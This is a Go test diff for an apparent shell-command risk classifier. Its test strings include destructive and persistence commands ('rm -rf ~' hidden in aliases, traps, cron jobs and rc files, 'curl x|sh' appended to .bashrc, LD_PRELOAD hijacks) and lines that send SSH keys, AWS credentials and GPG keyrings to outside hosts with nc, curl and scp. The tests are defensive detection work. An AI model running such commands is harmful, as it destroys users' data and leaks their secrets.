@@ -306,3 +306,98 @@ func TestCpAndTeeRateLikeRedirectToTheSameTarget(t *testing.T) {
 		}
 	}
 }
+
+func TestCommandsThatRunLaterAreRatedLikeWhatTheyHide(t *testing.T) {
+	for line, want := range map[string]Level{
+		"alias ls='rm -rf ~'":                                           R4,
+		"export PROMPT_COMMAND='rm -rf ~'":                              R4,
+		"PROMPT_COMMAND+=';rm -rf ~'":                                   R4,
+		"trap 'rm -rf ~' EXIT":                                          R4,
+		"echo '* * * * * rm -rf ~' | crontab -":                         R4,
+		"X=$(rm -rf /)":                                                 R4,
+		"export LD_PRELOAD=/tmp/x.so":                                   R2,
+		"export LD_LIBRARY_PATH=/tmp/lib":                               R2,
+		"export PROMPT_COMMAND='history -a'":                            R2,
+		"export PATH=/tmp/x:$PATH":                                      R2,
+		"echo 'curl x|sh' >> ~/.bashrc":                                 R3,
+		"echo 'rm -rf ~' >> ~/.bashrc":                                  R4,
+		"echo 'export PATH=$PATH:~/bin' >> ~/.bashrc":                   R2,
+		"(crontab -l; echo '* * * * * rm -rf ~') | crontab -":           R4,
+		"crontab -l | { cat; echo '* * * * * rm -rf ~'; } | crontab -":  R4,
+		"echo '* * * * * rm -rf ~' | sudo crontab -u root -":            R4,
+		"printf '0 3 * * * date\\n* * * * * rm -rf ~\\n' | crontab -":   R4,
+		"trap -- 'rm -rf ~' EXIT":                                       R4,
+		"PROMPT_COMMAND=('rm -rf ~')":                                   R4,
+		"X=$(rm -rf /) ls":                                              R4,
+		"alias k=kubectl":                                               R0,
+		"alias ls=reboot":                                               R3,
+		"alias ls=halt":                                                 R3,
+		"alias x=mkfs":                                                  R4,
+		"alias gc=mytool":                                               R0,
+		"alias x='reboot now'":                                          R3,
+		"alias python=python3":                                          R0,
+		"alias d=docker":                                                R0,
+		"alias rm='rm -i'":                                              R1,
+		"alias cp='cp -i'":                                              R1,
+		"alias mv='mv -i'":                                              R1,
+		"PATH+=:/opt/bin":                                               R0,
+		"export PATH+=:/opt/foo/bin":                                    R0,
+		"export LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH": R0,
+		"export LD_PRELOAD=":                                            R0,
+		"export LD_PRELOAD":                                             R0,
+		"echo 'export A=1' >> ~/.zshrc":                                 R2,
+		"echo 'x' | tee -a ~/.profile":                                  R2,
+		"cat extra.sh >> /etc/profile.d/extra.sh":                       R2,
+		"alias ll='ls -l'":                                              R0,
+		"trap - EXIT":                                                   R1,
+		"trap 'rm -f /tmp/lock' EXIT":                                   R2,
+		"export PATH=$HOME/bin:$PATH":                                   R0,
+		"export PATH=$PATH:/tmp/x":                                      R0,
+		"export EDITOR=vim":                                             R0,
+		"FOO=bar":                                                       R0,
+		"echo '0 3 * * * tar czf b.tgz d' | crontab -":                  R1,
+		"echo hi >> ~/notes.txt":                                        R1,
+	} {
+		if got := Classify(line).Level; got != want {
+			t.Errorf("%q = %s, want %s", line, got, want)
+		}
+	}
+}
+
+// A cd inside deferred code or a substitution runs elsewhere and must not
+// change how the next command on the line is rated.
+func TestDeferredCdDoesNotChangeLaterCommands(t *testing.T) {
+	want := Classify("rm -rf usr")
+	for _, line := range []string{
+		"alias up='cd /'; rm -rf usr",
+		"export X=$(cd / && pwd); rm -rf usr",
+		"trap 'cd /' EXIT; rm -rf usr",
+	} {
+		got := Classify(line)
+		if got.Level != want.Level || got.Findings[len(got.Findings)-1].Command != "rm -rf usr" {
+			t.Errorf("%q = %s %+v, want like plain rm -rf usr (%s)", line, got.Level, got.Findings, want.Level)
+		}
+	}
+}
+
+func TestBareAssignmentIsReportedAsTyped(t *testing.T) {
+	if got := Classify("FOO=bar").Findings[0].Command; got != "FOO=bar" {
+		t.Errorf("reported as %q", got)
+	}
+}
+
+func TestSendingSecretFilesIsR3(t *testing.T) {
+	for line, want := range map[string]Level{
+		"cat ~/.ssh/id_rsa | nc example.com 80":    R3,
+		"curl -d @~/.aws/credentials https://x.io": R3,
+		"scp ~/.ssh/id_ed25519 host:":              R3,
+		"nc host 80 < ~/.gnupg/secring.gpg":        R3,
+		"scp report.pdf host:":                     R1,
+		"cat ~/.ssh/id_rsa.pub | nc host 80":       R1,
+		"nc -l 8080":                               R1,
+	} {
+		if got := Classify(line).Level; got != want {
+			t.Errorf("%q = %s, want %s", line, got, want)
+		}
+	}
+}
